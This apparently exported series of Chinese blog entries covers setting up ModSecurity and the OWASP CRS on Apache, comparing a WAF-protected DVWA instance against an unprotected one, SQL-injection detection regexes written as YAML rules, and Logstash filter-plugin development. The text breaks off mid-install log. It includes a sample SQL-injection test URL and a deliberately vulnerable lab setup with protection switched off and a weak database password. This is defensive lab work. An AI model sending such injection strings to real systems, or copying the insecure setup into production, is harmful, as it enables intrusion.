将WordPress安装包解压到/var/www/wordpress，并修改/etc/apache2/sites-enabled/000-default.conf文件中的DocumentRoot, 将/var/www/html修改为/var/www/wordpress 。按照引导，顺利安装完成。 安装配置ModSecurity for Apache1. 安装ModSecurityModsecurity在Debian/Ubuntu源中可用：$ apt-get install libapache2-modsecurity 验证是否加载了mod_security模块:$ apachectl -M | grep --color security 看到一个名为security2_module (shared)的模块，表示模块已加载。或者使用下面命令验证版本。$ apt-cache show libapache2-modsecurity Modsecurity的安装包含必须重命名的推荐配置文件：$ sudo mv /etc/modsecurity/modsecurity.conf&#123;-recommended,&#125; 重新加载Apache:$ service apache2 reload ModSecurity的新日志文件将在/var/log/apache2/modsec_audit.log的Apache日志目录中创建$ ll /var/log/apache2/modsec_audit.log 2. 配置ModSecurity 基本配置 默认的ModSecurity配置文件设置为DetectionOnly ，根据规则匹配记录请求，不会阻塞任何东西。 这可以通过编辑modsecurity.conf文件和修改SecRuleEngine指令来改变。 $ sudo sed -i“s / SecRuleEngine DetectionOnly / SecRuleEngine On /”/etc/modsecurity/modsecurity.conf SecResponseBodyAccess指令配置响应主体是否被缓冲（即通过ModSecurity读取）。 这只有在需要数据泄漏检测和保护时才是必要的。 因此，将其留在将消耗一定资源，也增加日志文件的大小，所以我们将关闭它。 $ sudo sed -i“s / SecResponseBodyAccess On / SecResponseBodyAccess Off /”/etc/modsecurity/modsecurity.conf 可选配置 还有其他的指令可以通过编辑/etc/modsecurity/modsecurity.conf来定制。 SecRequestBodyLimit和SecRequestBodyNoFilesLimit指令会限制可以POST到Web应用程序的最大数据量。 SecRequestBodyLimit指令指定最大的POST数据大小。 如果客户端发送的数据量较大，则服务器将响应413 Request Entity Too Large错误。 如果Web应用程序没有任何文件上传，这个值可以大大减少。 配置文件中指定的预配置值为13107200字节（12.5MB） SecRequestBodyLimit 13107200 SecRequestBodyNoFilesLimit限制POST数据量除掉文件上传部分。这个值应尽可能低，以减少有人发送大尺寸的请求主体时拒绝服务（DoS）攻击的可能性。 配置文件中的预配置值为131072字节（128KB）。 SecRequestBodyInMemoryLimit 131072 SecRequestBodyInMemoryLimit` 这个指令关乎服务器性能，它指定多少“请求主体”数据（POST数据）保存在内存（RAM）中，而其余的部分放在硬盘中（就像swapping）。如果使用的是固态硬盘，影响不大。如果有足够的RAM可用，可以配置一个更合适的值。该指令的预配置值是128KB。 SecRequestBodyInMemoryLimit 131072 3. 规则设置在这一步中，我们将设置一些ModSecurity规则。 启动CRS 为了方便起见，ModSecurity已经安装了很多规则。 这些被称为CRS（Core Rule Set），位于/usr/share/modsecurity-crs目录中。 要加载这些规则，我们需要配置Apache来读取这些目录中的.conf文件，所以打开security2.conf文件进行编辑。 $ sudo vim /etc/apache2/mods-enabled/security2.conf 在&lt;IfModule security2_module&gt; &lt;/IfModule&gt;添加以下指令: IncludeOptional /etc/modsecurity/*.conf #IncludeOptional /usr/share/modsecurity-crs/*.confIncludeOptional /usr/share/modsecurity-crs/activated_rules/*.conf 目录/域排除(可选) 有时，如果运行某个应用程序（如phpMyAdmin），则排除特定目录或域名是有意义的，因为ModSecurity将阻止SQL查询。排除CMS(如：WordPress）管理后台也是不错的选择。 要在VirtualHost中禁用ModSecurity，请将以下指令放置在其虚拟主机文件的&lt;VirtualHost&gt;[...]&lt;/VirtualHost&gt;块中。 &lt;IfModule security2_module&gt; SecRuleEngine Off &lt;/IfModule&gt; 排除特定目录（如：/var/www/wordpress/wp-admin): &lt;Directory "/var/www/wp-admin"&gt; &lt;IfModule security2_module&gt; SecRuleEngine Off &lt;/IfModule&gt;&lt;/Directory&gt; 如果您不想在目录中完全禁用ModSecurity，请使用SecRuleRemoveById指令通过指定其ID来排除特定的规则或规则链。 &lt;LocationMatch "/wp-admin/update.php"&gt; &lt;IfModule security2_module&gt; SecRuleRemoveById 981173 &lt;/IfModule&gt;&lt;/LocationMatch&gt; 4. 规则激活接下来，我们将激活规则文件。所需的规则文件应该被link到activated_rules目录，这与Apache mods-enabled目录类似。 切换到activated_rules目录。$ cd /usr/share/modsecurity-crs/activated_rules/ 该目录中的README文件描述了symlinks的创建方法。 $ sudo ln -s ../modsecurity_crs_10_setup.conf ./$ for f in `ls ../base_rules/` ; do sudo ln -s ../base_rules/$f ./$f ; done$ for f in `ls ../optional_rules/ | grep comment_spam` ; do sudo ln -s ../optional_rules/$f ./$f ; done$ ls -l ./ 重启Apache2以使规则生效$ systemctl restart apache2 运行效果：从运行日志可以看出，无法正常访问的原因是，命中了modsecurity_crs_21_protocol_anomalies.conf中的规则。 从activated_rules目录中移除modsecurity_crs_21_protocol_anomalies.conf后仍有一个访问被拦截，原因是”POST request missing Content-Length Header.” 移除modsecurity_crs_20_protocol_violations.conf规则后，访问页面无日志产生。 尝试访问 http://10.1.1.3/?s=wordpress%’ or ‘’=’ 被成功拦截。 5. 升级CRS到最新版本上一个节中使用的ModSecurity自带CRS，其版本为2.2.9，而目前最新的CRS已经为3.0.2版本，所以手动更新CRS还是有必要的。官方主页 ： https://modsecurity.org/crs/$ cd /usr/share/$ git clone https://github.com/SpiderLabs/owasp-modsecurity-crs.git$ cd owasp-modsecurity-crs$ vim INSTALL 参考 INSTALL 文件进行安装 将crs-setup.conf.example复制到crs-setup.conf 重命名rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example和rules/RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example，删除’.example’扩展名。 如此，在升级的时候不会被覆盖。 修改 mods-enabled/security2.conf 文件中 &lt;IfModule security2_module&gt; &lt;/IfModule&gt; 配置 重启Apache $ sudo cp crs-setup.conf.example crs-setup.conf$ sudo cp rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf$ sudo cp rules/RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example rules/RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf$ sudo vim /etc/apache2/mods-enabled/security2.conf# &gt;&gt;&gt;&gt;&gt;&gt; # IncludeOPtional 与 Include 作用一致 IncludeOptional /etc/modsecurity/*.conf Include /usr/share/owasp-modsecurity-crs/crs-setup.conf IncludeOptional /usr/share/owasp-modsecurity-crs/rules/*.conf# &lt;&lt;&lt;&lt;&lt;&lt;$ sudo systemctl restart apache2 提交攻击性访问 成功拦截！ 给DVWA武装上ModSecurityDVWA是一款基于php&amp;mysql编写的用于常规WEB漏洞检测的脆弱web应用,其中包含了一些常见的WEB漏洞。今天，我们试试让DVWA武装上ModSecurity，看看在网络攻击中能够坚挺？ 1. 部署DVWA# 下载并解压DVWA$ wget https://github.com/ethicalhack3r/DVWA/archive/master.zip$ unzip master.zip -d /var/www/ # DVWA-master$ cp /var/www/DVWA-master /var/www/DVWA-ignoreModSec # 修改Apache配置$ cd /etc/apache2/sites-available$ sudo vim /etc/apache2/sites-enabled/000-default.conf # &gt;&gt;&gt; 修改DocumentRoot DocumentRoot /var/www/DVWA-master # &lt;&lt;&lt;$ sudo vim /etc/apache2/port.conf # &gt;&gt;&gt; 添加8080端口 Listen 80 Listen 8080 # &lt;&lt;&lt;&lt;$ cp /etc/apache2/sites-enabled/000-default.conf /etc/apache2/sites-enabled/001-dvwa8080.conf$ sudo ln -sf /etc/apache2/sites-available/001-dvwa8080.conf /etc/apache2/sites-enabled/001-dvwa8080.conf$ cd /etc/apache2/sites-enabled/$ vim 001-dvwa8080.conf # &gt;&gt;&gt; 修改 *:80 为 *:8080 在此域名中关闭ModSecurity &lt;VirtualHost *:8080&gt; DocumentRoot /var/www/DVWA-ignoreModSec &lt;IfModule security2_module&gt; SecRuleEngine Off &lt;/IfModule&gt; # &lt;&lt;&lt;$ service apache2 restart# MySQL配置$ mysql -uroot -p mysql&gt; create database dvwa; # dvwa数据库，用于被ModSecurity保护的DVWA实例 mysql&gt; create user bingo identified by 'myPass'; mysql&gt; grant all privileges on dvwa.* to bingo@localhost identified by "myPass"; mysql&gt; flush privileges; mysql&gt; create database dvwa-vuln; # dvwa_vuln数据库，用于暴露的DVWA实例 mysql&gt; grant all privileges on dvwa_vuln.* to bingo@localhost identified by "myPass"; mysql&gt; flush privileges;# 配置DVWA$ cd /var/www/DVWA-master$ cp config/config.inc.php.dist config/config.inc.php$ vim config/config.inc.php # &gt;&gt;&gt; 修改数据库配置及DVWA安全级别 $_DVWA[ 'db_server' ] = '127.0.0.1'; $_DVWA[ 'db_database' ] = 'dvwa'; $_DVWA[ 'db_user' ] = 'bingo'; $_DVWA[ 'db_password' ] = 'myPass'; $_DVWA[ 'default_security_level' ] = 'low'; # &lt;&lt;&lt;$ cd /var/www/DVWA-ignoreModSec$ cp config/config.inc.php.dist config/config.inc.php$ vim config/config.inc.php # &gt;&gt;&gt; 修改数据库配置及DVWA安全级别 $_DVWA[ 'db_server' ] = '127.0.0.1'; $_DVWA[ 'db_database' ] = 'dvwa_vuln'; $_DVWA[ 'db_user' ] = 'bingo'; $_DVWA[ 'db_password' ] = 'myPass'; $_DVWA[ 'default_security_level' ] = 'low'; # &lt;&lt;&lt; 2. 对比测试两套DVWA同时运行，80和8080端口，80端口被ModSecurity保护，而ModSecurity则没有。 SQL注入： 文件包含： XSS： 由此可见，ModSecurity起到了一定的防护作用。 不过，在代码执行与文件上传未能成功防御。 后记下一步，我将探索ModSecurity为代表的WAF防御规则，分析传统防御规则的缺陷，及改进思路。 下两步，我将探索基于语义分析、机器学习的应用技术。。。 参考资料https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual https://www.netnea.com/cms/apache-tutorial-7_including-modsecurity-core-rules/ https://www.digitalocean.com/community/tutorials/how-to-set-up-mod_security-with-apache-on-debian-ubuntu https://www.digitalocean.com/community/tutorials/how-to-set-up-modsecurity-with-apache-on-ubuntu-14-04-and-debian-8 https://www.linode.com/docs/web-servers/apache-tips-and-tricks/configure-modsecurity-on-apache/ https://komunity.komand.com/learn/article/server-administration/how-to-configure-modsecurity-with-apache-on-ubuntu-linux/ https://www.feistyduck.com/library/modsecurity-handbook-2ed-free/?t=ce4c8:fa719091acb66f8f https://www.cnblogs.com/shengulong/p/6210234.html]]></content>
      <tags>
        <tag>WAF</tag>
        <tag>ModSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【先占坑，待完善】YAML配置文件初识]]></title>
    <url>%2F2017%2FYAML%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%88%9D%E8%AF%86%2F</url>
    <content type="text"><![CDATA[YAML是一个类似 XML、JSON 的标记性语言。YAML 强调以数据为中心，并不是以标识语言为重点。因而 YAML 本身的定义比较简单，号称“一种人性化的数据格式语言”。 YAML 是专门用来写配置文件的语言，非常简洁和强大，远比 JSON 格式方便。 基本规则 基本语法规则： 大小写敏感 使用缩进表示层级关系 缩进时不允许使用Tab键，只允许使用空格 缩进的空格数目不重要，只要相同层级的元素左侧对齐即可 其它规则 # 为注释符 YAML 允许使用两个感叹号，强制转换数据类型。 e: !!str 123 # 整数123转换为字符串123 f: !!str true # 布尔型true转换为字符串true. 支持的数据结构 对象：键值对的集合，又称为映射（mapping）/ 哈希（hashes） / 字典（dictionary）。 对象的一组键值对，使用冒号结构表示。 数组：一组按次序排列的值，又称为序列（sequence） / 列表（list） 一组连词线开头的行，构成一个数组。 纯量（scalars）：单个的、不可再分的值。 纯量是最基本的、不可再分的值。如：字符串、布尔值、整数、浮点数、Null、时间等 示例- id: 1 pattern: (?i:(?:(select|;)\s+(?:benchmark|if|sleep)\s*?\(\s*?\(?\s*?\w+)) attacktype: SQLi severity: CRITICAL place: QUERY # REQUEST表示URL位置，QUERY表示GET参数位置，UA表示User-Agent位置。 msg: Detects SQL benchmark and sleep injection attempts including conditional queries- id: 2 pattern: (?i:(?:(union(.*?)select(.*?)from))) attacktype: SQLi severity: CRITICAL place: QUERY msg: Looking for basic sql injection. Common attack string for mysql, oracle and others.- id: 3 pattern: (?i:(sleep\((\s*?)(\d*?)(\s*?)\)|benchmark\((.*?)\,(.*?)\))) attacktype: SQLi severity: CRITICAL place: QUERY msg: Detects blind sqli tests using sleep() or benchmark().- id: 4 pattern: (?i:(?:,.*?[)\da-f\"'`][\"'`](?:[\"'`].*?[\"'`]|\Z|[^\"'`]+))|(?:\Wselect.+\W*?from)|((?:select|create|rename|truncate|load|alter|delete|update|insert|desc)\s*?\(\s*?space\s*?\()) attacktype: SQLi severity: CRITICAL place: QUERY msg: Detects MySQL comment-/space-obfuscated injections and backtick termination 参考资料http://www.yaml.org http://www.ruanyifeng.com/blog/2016/07/yaml.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用ModSecurity-CRS规则库开发Logstash过滤器插件]]></title>
    <url>%2F2017%2F%E5%88%A9%E7%94%A8ModSecurity-CRS%E8%A7%84%E5%88%99%E5%BA%93%E5%BC%80%E5%8F%91Logstash%E8%BF%87%E6%BB%A4%E5%99%A8%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[香菇！！！！ ModSecurity-CRS + Ruby 搞不动了！ 换方案！ 在使用ELK套件进行日志分析的工作中，攻击识别是很有必要的一项工作，而logstash的官方插件库中并没有这样功能的插件，故而考虑自己开发出来插件。ModSecurity目前应该算是最好的开源WEB应用防火墙(WAF)，直接提取ModSecurity的规则库是一个不错的选择。 so, just do it. 获取ModSecurity-CRS规则OWASP ModSecurity Core Rule Set (CRS) Project (Official Repository) https://modsecurity.org/crs 下载规则库：git clone https://github.com/SpiderLabs/owasp-modsecurity-crs.git 进入目录，先看看其中一个规则文件：./owasp-modsecurity-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf 其中检测数据库名称的配置信息如下：## -=[ Detect DB Names ]=-#SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* &quot;(?i:\b(?:m(?:s(?:ysaccessobjects|ysaces|ysobjects|ysqueries|ysrelationships|ysaccessstorage|ysaccessxml|ysmodules|ysmodules2|db)|aster\.\.sysdatabases|ysql\.db)\b|s(?:ys(?:\.database_name|aux)\b|chema(?:\W*\(|_name\b)|qlite(_temp)?_master\b)|d(?:atabas|b_nam)e\W*\(|information_schema\b|pg_(catalog|toast)\b|northwind\b|tempdb\b))&quot; \ &quot;phase:request,\ rev:&apos;3&apos;,\ ver:&apos;OWASP_CRS/3.0.0&apos;,\ maturity:&apos;9&apos;,\ accuracy:&apos;8&apos;,\ capture,\ t:none,t:urlDecodeUni,\ ctl:auditLogParts=+E,\ block,\ msg:&apos;SQL Injection Attack: Common DB Names Detected&apos;,\ id:942140,\ logdata:&apos;Matched Data: %&#123;TX.0&#125; found within %&#123;MATCHED_VAR_NAME&#125;: %&#123;MATCHED_VAR&#125;&apos;,\ severity:&apos;CRITICAL&apos;,\ tag:&apos;application-multi&apos;,\ tag:&apos;language-multi&apos;,\ tag:&apos;platform-multi&apos;,\ tag:&apos;attack-sqli&apos;,\ tag:&apos;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&apos;,\ tag:&apos;WASCTC/WASC-19&apos;,\ tag:&apos;OWASP_TOP_10/A1&apos;,\ tag:&apos;OWASP_AppSensor/CIE1&apos;,\ tag:&apos;PCI/6.5.2&apos;,\ setvar:&apos;tx.msg=%&#123;rule.msg&#125;&apos;,\ setvar:tx.sql_injection_score=+%&#123;tx.critical_anomaly_score&#125;,\ setvar:tx.anomaly_score=+%&#123;tx.critical_anomaly_score&#125;,\ setvar:tx.%&#123;rule.id&#125;-OWASP_CRS/WEB_ATTACK/SQL_INJECTION-%&#123;matched_var_name&#125;=%&#123;tx.0&#125;&quot; 正则表达式分析：(?i:\b( ?:m( ?:s( ?:ysaccessobjects # 匹配msysaccessobjects |ysaces |ysobjects |ysqueries |ysrelationships |ysaccessstorage |ysaccessxml |ysmodules |ysmodules2 |db ) |aster\.\.sysdatabases|ysql\.db # 匹配master )\b |s( ?:ys(?:\.database_name|aux)\b # 配置sys.database_name或者sysaux |chema(?:\W*\(|_name\b) |qlite(_temp)?_master\b ) |d(?:atabas|b_nam)e\W*\( |information_schema\b # 匹配information_schema |pg_(catalog|toast)\b |northwind\b |tempdb\b )) 利用上述正则表达式，在日志文件中进行匹配： 插件编写1. 新建插件利用logstash-plugin命令生成插件项目文件。 cd /Applications/logstashbin/logstash-plugin generate --type filter --name attackDetection --path ~/Documents/Code/logstash-plugin# 生成下列文件 Creating /Users/jason/Documents/Code/logstash-plugin/logstash-filter-attackdetection create logstash-filter-attackdetection/CHANGELOG.md create logstash-filter-attackdetection/CONTRIBUTORS create logstash-filter-attackdetection/DEVELOPER.md create logstash-filter-attackdetection/Gemfile create logstash-filter-attackdetection/lib/logstash/filters/attackDetection.rb create logstash-filter-attackdetection/LICENSE create logstash-filter-attackdetection/logstash-filter-attackDetection.gemspec create logstash-filter-attackdetection/Rakefile create logstash-filter-attackdetection/README.md create logstash-filter-attackdetection/spec/filters/attackDetection_spec.rb create logstash-filter-attackdetection/spec/spec_helper.rb]]></content>
      <tags>
        <tag>Logstash</tag>
        <tag>ELK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[logstash自定义过滤器插件开发入门]]></title>
    <url>%2F2017%2Flogstash%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[本文主要参考官方文档(How to write a Logstash filter plugin)进行实践。 前面因为Logstash是用ruby开发的，所以插件也需要用ruby语言进行开发。相关入门 https://www.ruby-lang.org/en/documentation/quickstart/ Ruby RVM Ruby Version Manager 版本管理 Rails 开发框架，应该类似于Django之类 RubyGems Ruby程序包管理器(package manager),类似RedHat的RPM,将一个Ruby应用程序打包到一个gem里。 Gem Gem是封装起来的Ruby应用程序或代码库。 注：在终端使用的gem命令，是指通过RubyGems管理Gem包。 Gemfile 定义应用所依赖的第三方包，bundle根据该配置去寻找这些包。 Rake Rake是一门构建语言，和make类似。Rake是用Ruby写的，它支持自己的DSL用来处理和维护Ruby程序。 Rakefile Rakefile是由Ruby编写，Rake命令执行的就是由Rakefile文件定义的。 Bundle 相当于多个RubyGems批处理运行。在配置文件gemfilel里说明你的应用依赖哪些第三方包，他自动帮你下载安装多个包，并且会下载这些包依赖的包。感觉类似于pip JRuby 一个采用纯Java实现的Ruby解释器 如有必要，参考官方的filter是一个很好的选择。 https://www.elastic.co/guide/en/logstash/current/filter-plugins.html# 使用命令行查看当前已安装的插件bingo@U:/usr/share/logstash$ logstash-plugin list# 查找插件插件文件路径bingo@U:/usr/share/logstash$ find ./ | egrep "logstash-filter.*\.gemspec" PS：之前将logstash部署在Ubuntu虚拟机上的，为了便于开发，在MAC本机也安装一个(下载ZIP包) Step by step 入门1. 为插件创建新的GitHub库( logstash-filter-test )2. 使用插件生成工具logstash-plugin命令的generate子命令可以为新插件生成基础文件。它创建目录结构、gemspec文件及依赖关系，只需要添加好自定义代码就可以了。更多的信息可查阅官方文档：https://www.elastic.co/guide/en/logstash/current/plugin-generator.html 3. 拷贝示例代码除了上述生成代码外，还可以直接拷贝示例代码，以开始编码。 将第1步创建的库克隆到本地 克隆广泛example库到本地 清除example库中的git信息后将文件拷贝到个人库目录 重命名插件名git clone https://github.com/odboy/logstash-filter-test.gitgit clone https://github.com/logstash-plugins/logstash-filter-example.gitcd logstash-filter-examplerm -rf .git # 移除git信息cp -R * ../logstash-filter-testcd ../logstash-filter-test# 修改插件名 # 代码和配置文件中的名称也需要一并修改，此处不一一列出mv logstash-filter-example.gemspec logstash-filter-test.gemspecmv lib/logstash/filters/example.rb lib/logstash/filters/test.rbmv spec/filters/example_spec.rb spec/filters/test_spec.rb# 显示树结构➜ logstash-filter-test git:(master) ✗ tree ././├── CHANGELOG.md├── CONTRIBUTORS├── DEVELOPER.md├── Gemfile├── LICENSE├── NOTICE.TXT├── README.md├── Rakefile├── ci│ ├── build.sh│ └── setup.sh├── lib│ └── logstash│ └── filters│ └── test.rb├── logstash-filter-test.gemspec└── spec ├── filters │ └── test_spec.rb └── spec_helper.rb6 directories, 14 files 4. 代码解读 ./lib/logstash/filters/test.rb# encoding: utf-8 # 声明编码require "logstash/filters/base" require "logstash/namespace" # This example filter will replace the contents of the default# message field with whatever you specify in the configuration.## It is only intended to be used as an example.class LogStash::Filters::Test &lt; LogStash::Filters::Base # 类声明 # Setting the config_name here is required. This is how you # configure this filter from your Logstash config. # # filter &#123; # test &#123; # message =&gt; "My message..." # &#125; # &#125; # config_name "test" # 插件名 # Replace the message with this value. config :message, :validate =&gt; :string, :default =&gt; "Hello World!" # 参数配置 # config :variable_name, :validate =&gt; :variable_type, :default =&gt; "Default value", :required =&gt; boolean, :deprecated =&gt; boolean, :obsolete =&gt; string # variable_name就是参数的名称了。 # validate 定义是否进行校验，如果不是指定的类型，在logstash -f xxx --configtest的时候就会报错。它支持多种数据类型，比如:string, :password, :boolean, :number, :array, :hash, :path (a file-system path), :codec (since 1.2.0), :bytes. # default 定义参数的默认值 # required 定义参数是否是必须值 # deprecated 定义参数的额外信息，比如一个参数不再推荐使用了，就可以通过它给出提示！典型的就是es-output里面的Index_type，当使用这个参数时，就会给出提示： # config :index_type, :validate =&gt; :string, :deprecated =&gt; "Please use the 'document_type' setting instead. It has the same effect, but is more appropriately named." # 过滤器必须实现register和filter方法 # Logstash中的register方法类似于initialize方法。 public # ruby中需要显示声明public def register # Add instance variables end # def register # 该filter方法为实际过滤工作发生的地方。在该方法内，可以使用Event对象引用event(事件)数据。 # Event是在Logstash内部封装数据流的主要对象，并为插件开发人员提供了一个与事件内容交互的API。 # filter方法还应该通过显示调用Event类中的可用sprintf方法来处理任何“事件相关配置”。 public def filter(event) if @message # Replace the event message with our message as configured in the # config file. # using the event.set API event.set("message", @message) # correct debugging log statement for reference # using the event.get API @logger.debug? &amp;&amp; @logger.debug("Message is now: #&#123;event.get("message")&#125;") end # filter_matched should go in the last line of our successful code # 在成功执行插件时调用filter_matched方法将确保通过Logstash配置为此过滤器添加的任何字段或标记都将被正确处理。 例如，此时将执行任何add_field，remove_field，add_tag和/或remove_tag操作。 filter_matched(event) # 该方法会把事件传入下一个过滤器 # Event方法（如event.cancel）现在可用于控制正在处理的事件的工作流程。 end # def filterend # class LogStash::Filters::Test 5. 建立插件在此，我们已经编写好了插件的代码，并准备从中构建一个Ruby Gem。 外部依赖 Ruby文件头部的require声明用于包含必要的代码。在某些情况下，我们的插件可能需要额外的文件。 例如，logstash-codec-collectd插件使用“collectd”提供的types.db文件。位于插件主目录中的vendor.json文件描述了这些文件的位置。 vendor.json文件包含一个JSON对象数组，每个JSON对象描述一个文件依赖关系。这个例子来自collectd编解码器插件： [&#123; "sha1": "a90fe6cc53b76b7bdd56dc57950d90787cb9c96e", # 验证URL引用文件的完整性 "url": "http://collectd.org/files/collectd-5.4.0.tar.gz", # Logstash下载该文件的地址 "files": [ "/src/types.db" ] # 可选项！ 指定从URL对应文件中提取指定文件，如果不指定，所有文件都会被提取出来。&#125;] 除了collectd插件外，geoip插件也有vendor.json文件 用于下载这些依赖项的过程是rake vendor，测试部分进一步说明。 另外一种外部依赖是在jar文件上，这将在“添加gemspec文件”一节中介绍。 添加Gemfile文件 Gemfile允许Ruby的Bundler维护插件的依赖关系。 目前，我们只需要用于测试的Logstash gem，如需要其他gem，则需要添加到这里。 从example中拷贝过来的Gemfile文件内容如下： source 'https://rubygems.org'gemspeclogstash_path = ENV["LOGSTASH_PATH"] || "../../logstash"use_logstash_source = ENV["LOGSTASH_SOURCE"] &amp;&amp; ENV["LOGSTASH_SOURCE"].to_s == "1"if Dir.exist?(logstash_path) &amp;&amp; use_logstash_sourcegem 'logstash-core', :path =&gt; "#&#123;logstash_path&#125;/logstash-core"gem 'logstash-core-plugin-api', :path =&gt; "#&#123;logstash_path&#125;/logstash-core-plugin-api"endgem "logstash", :github =&gt; "elastic/logstash", :branch =&gt; "5.6" # 按照教程额外添加的配置项，否则bundle install时会报错：Could not find gem 'logstash-devutils' in any of the gem sources listed in your Gemfile. # 添加该行配置，出现[坑0x02]报错。# 经查资料，需要jruby. 添加gemspec文件 gemspec定义了将被构建并包含插件的Ruby gem。 http://guides.rubygems.org/specification-reference/ Gem::Specification.new do |s|s.name = 'logstash-filter-test's.version = '3.0.1's.licenses = ['Apache License (2.0)'] # 如果需要公开插件，则需要添加该licenses.summary = "This example filter replaces the contents of the message field with the specified value."s.description = "This gem is a Logstash plugin required to be installed on top of the Logstash core pipeline using $LS_HOME/bin/logstash-plugin install gemname. This gem is not a stand-alone program"s.authors = ["Mr.Bingo"]s.email = 'bingo@oddboy.cn's.homepage = "http://oddboy.cn"s.require_paths = ["lib"]# Filess.files = Dir['lib/**/*','spec/**/*','vendor/**/*','*.gemspec','*.md','CONTRIBUTORS','Gemfile','LICENSE','NOTICE.TXT']# Testss.test_files = s.files.grep(%r&#123;^(test|spec|features)/&#125;)# Special flag to let us know this is actually a logstash plugins.metadata = &#123; "logstash_plugin" =&gt; "true", "logstash_group" =&gt; "filter" &#125;# Gem dependenciess.add_runtime_dependency "logstash-core-plugin-api", "~&gt; 2.0"s.add_development_dependency 'logstash-devutils'end 运行及开发依赖 在gemspec文件的底部是一个带有注释的部分：Gem依赖关系。所有需要依赖的gem都需要在此声明。 插件需要使用的gem添加到运行时依赖项。 如果只是用于测试，则需要添加到开发依赖项。 PS：所有插件对logstash-core-plugin-api gem都有运行时依赖，并且对logstash-devutils有开发依赖。 Jar依赖 在某些情况，例如ElasticSearch的output插件，代码可能会依赖jar文件。在这种情况下，以如下方式在gemspec文件中添加依赖关系。 # Jar dependenciess.requirements &lt;&lt; "jar 'org.elasticsearch:elasticsearch', '5.0.0'"s.add_runtime_dependency 'jar-dependencies' 不过在filter插件中一般应该不会用到··· 6. 调试/测试既然按照教程添加了GitHub库，最好还是先push一下。git add .git commit -m &quot;从logstash-filter-example拷 贝&quot;git push 使用bundler安装依赖# 将Gemfile中的#source 'https://rubygems.org' 修改为 source 'https://gems.ruby-china.org/'sudo gem install bundle # 安装bundlebundle -v # Bundler version 1.16.0#rake vendor # 如果有vendor.json文件需要使用该命令下载依赖文件bundle install # 安装依赖 坑0x01:➜ logstash-filter-test git:(master) ✗ bundle installFetching gem metadata from https://gems.ruby-china.org/..........Could not find gem 'logstash-devutils' in any of the gem sources listed in your Gemfile. 坑0x02:➜ logstash-filter-test git:(master) ✗ bundle installThe git source `git://github.com/elastic/logstash.git` uses the `git` protocol, which transmits data without encryption. Disable this warning with `bundle config git.allow_insecure true`, or switch to the `https` protocol to keep your data secure.Fetching git://github.com/elastic/logstash.git[!] There was an error while loading `logstash-core-plugin-api.gemspec`: The logstash-core-api need to be build on jruby. Bundler cannot continue. # from /Users/jason/.bundle/ruby/2.0.0/logstash-01a419793a67/logstash-core-plugin-api/logstash-core-plugin-api.gemspec:27 # ------------------------------------------- # else &gt; raise "The logstash-core-api need to be build on jruby" # end # ------------------------------------------- 尝试解决：(通过RVM安装Jruby)&gt; vim ~/.zshrc # 添加JAVA相关环境变量。******************************export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_112.jdk/Contents/Homeexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport PATH=$JAVA_HOME/bin:$PATH******************************# https://ruby-china.org/wiki/rvm-guide&gt; rvm install jruby # 安装jruby&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; Searching for binary rubies, this might take some time. Found remote file https://s3.amazonaws.com/jruby.org/downloads/9.1.13.0/jruby-bin-9.1.13.0.tar.gz Checking requirements for osx. Requirements installation successful. jruby-9.1.13.0 - #configure jruby-9.1.13.0 - #download ** Resuming transfer from byte position 397312 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 19.6M 100 19.6M 0 0 1695k 0 0:00:11 0:00:11 --:--:-- 2474k jruby-9.1.13.0 - #validate archive jruby-9.1.13.0 - #extract jruby-9.1.13.0 - #validate binary jruby-9.1.13.0 - #setup jruby-9.1.13.0 - #gemset created /Users/jason/.rvm/gems/jruby-9.1.13.0@global jruby-9.1.13.0 - #importing gemset /Users/jason/.rvm/gemsets/jruby/global.gems.. jruby-9.1.13.0 - #generating global wrappers........ jruby-9.1.13.0 - #gemset created /Users/jason/.rvm/gems/jruby-9.1.13.0 jruby-9.1.13.0 - #importing gemsetfile /Users/jason/.rvm/gemsets/default.gems evaluated to empty gem list jruby-9.1.13.0 - #generating default wrappers........&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; # done [rvm install jruby]&gt; rvm gemset create test # gemset是一个独立的虚拟gem环境，此处创建一个名为test的gemset.&gt; jruby -version # 查看jruby版本 （jruby list known) jruby[-9.1.13.0]&gt; rvm use jruby-9.1.13.0@test # 为test gemset配置ruby版本&gt; gem install bundler # 安装bundler，否则bundle install会报错：“in `to_specs': Could not find 'bundler' (&gt;= 0) among 16 total gem(s) (Gem::LoadError)”&gt; bundle install # 安装依赖&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; Fetching gem metadata from https://gems.ruby-china.org/.......... Resolving dependencies.................. Using rake 12.2.1 Using bundler 1.16.0 Fetching numerizer 0.1.1 Installing 